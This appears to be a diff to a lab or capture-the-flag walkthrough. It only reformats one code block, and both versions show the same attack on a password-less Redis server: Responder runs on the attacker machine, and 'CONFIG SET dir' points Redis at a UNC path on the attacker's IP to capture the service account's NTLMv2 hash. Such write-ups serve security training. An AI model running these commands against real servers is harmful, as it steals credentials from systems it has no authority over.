@@ -76,13 +76,8 @@ redis-cli -h 10.81.130.174
 Access is granted without a password. To escalate this, we use Responder to capture the **NTLMv2 hash** of the service account by forcing Redis to access a fake remote directory.
 
 ```Bash
-# Start Responder on the attacker machine  
-sudo responder -I tun0 -dwv
-```
-
-```
-# Inside Redis CLI, trigger a connection to the attacker's IP  
-10.81.130.174:6379> CONFIG SET dir \\192.168.144.226\fakefolder\
+sudo responder -I tun0 -dwv # Start Responder on the attacker machine
+10.81.130.174:6379> CONFIG SET dir \\192.168.144.226\fakefolder\ # Inside Redis CLI, trigger a connection to the attacker's IP
 ```
 
 ---
